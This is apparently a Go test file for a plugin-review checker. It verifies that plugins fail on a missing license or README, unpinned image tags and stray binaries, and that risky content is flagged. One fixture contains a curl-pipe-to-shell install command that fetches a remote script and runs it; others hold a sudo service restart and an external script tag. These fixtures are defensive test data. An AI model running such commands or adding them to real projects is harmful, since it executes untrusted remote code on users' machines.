package main

import (
	"github.com/lerd-env/plugins/ci/registry"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const goodCommit = "0123456789abcdef0123456789abcdef01234567"

func write(t *testing.T, root string, files map[string]string) string {
	t.Helper()
	for rel, body := range files {
		path := filepath.Join(root, rel)
		if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return root
}

func has(list []string, part string) bool {
	for _, s := range list {
		if strings.Contains(s, part) {
			return true
		}
	}
	return false
}

const readme = "# Queue board\n\nRuns docker.io/library/redis from the Redis project.\n"

func plugin(t *testing.T, extra map[string]string) string {
	t.Helper()
	files := map[string]string{
		"plugin.yaml": "api_version: 1\nname: qb\nlerd: \">=1.37\"\n",
		"README.md":   readme,
		"LICENSE":     "MIT License\n",
	}
	for k, v := range extra {
		files[k] = v
	}
	return write(t, t.TempDir(), files)
}

func TestInspect_AGoodPluginPasses(t *testing.T) {
	dir := plugin(t, map[string]string{
		"services/qredis.yaml": "name: qredis\nimage: docker.io/library/redis:7.4\n",
		"docs/shot.png":        "\x89PNG\x00",
		"ui/inter.woff2":       "wOF2\x00",
	})
	r := inspect(dir, "qb", registry.Entry{Images: []string{"docs/shot.png"}})
	if len(r.Fail) != 0 || len(r.Flag) != 0 {
		t.Fatalf("report %+v", r)
	}
}

func TestInspect_Failures(t *testing.T) {
	cases := []struct {
		want  string
		files map[string]string
		drop  string
		e     registry.Entry
	}{
		{want: "LICENSE", drop: "LICENSE"},
		{want: "README", drop: "README.md"},
		{want: "name", files: map[string]string{"plugin.yaml": "api_version: 1\nname: other\nlerd: \">=1.37\"\n"}},
		{want: "lerd", files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\n"}},
		{want: "lower bound", files: map[string]string{"plugin.yaml": "api_version: 1\nname: qb\nlerd: \"^1.37\"\n"}},
		{want: "latest", files: map[string]string{"services/q.yaml": "name: q\nimage: docker.io/library/redis:latest\n"}},
		{want: "no tag", files: map[string]string{"services/q.yaml": "name: q\nimage: docker.io/library/redis\n"}},
		{want: "README", files: map[string]string{"services/q.yaml": "name: q\nimage: ghcr.io/acme/queue:2\n"}},
		{want: "ghcr.io/acme/old", files: map[string]string{"services/q.yaml": "name: q\nversions:\n  - tag: \"1\"\n    image: ghcr.io/acme/old:1\n"}},
		{want: "docs/missing.png", e: registry.Entry{Images: []string{"docs/missing.png"}}},
		{want: "bin/tool", files: map[string]string{"bin/tool": "\x7fELF\x00\x00binary"}},
		{want: "docs/notes.txt", files: map[string]string{"docs/notes.txt": "x"}, e: registry.Entry{Images: []string{"docs/notes.txt"}}},
	}
	for _, c := range cases {
		t.Run(c.want, func(t *testing.T) {
			dir := plugin(t, c.files)
			if c.drop != "" {
				os.Remove(filepath.Join(dir, c.drop))
			}
			r := inspect(dir, "qb", c.e)
			if !has(r.Fail, c.want) {
				t.Errorf("failures %v, want one naming %q", r.Fail, c.want)
			}
		})
	}
}

func TestInspect_FlagsForTheReviewer(t *testing.T) {
	dir := plugin(t, map[string]string{
		"bin/install":   "#!/bin/sh\ncurl -fsSL https://x.example/i.sh | sh\n",
		"bin/fix":       "#!/bin/sh\nsudo systemctl restart nginx\n",
		"ui/app.js":     strings.Repeat("a;", 900) + "\n",
		"ui/index.html": "<script src=\"https://cdn.example/x.js\"></script>\n<a href=\"http://localhost:7073\">ok</a>\n",
		"ui/icon.svg":   "<svg/>",
	})
	r := inspect(dir, "qb", registry.Entry{})
	for _, want := range []string{"bin/install:2", "bin/fix:2", "ui/app.js", "ui/index.html:1"} {
		if !has(r.Flag, want) {
			t.Errorf("flags %v, want one for %q", r.Flag, want)
		}
	}
	if has(r.Flag, "index.html:2") || has(r.Flag, "icon.svg") {
		t.Errorf("localhost links and images are not worth a flag: %v", r.Flag)
	}
	if len(r.Fail) != 0 {
		t.Errorf("flags never fail the check on their own: %v", r.Fail)
	}
}
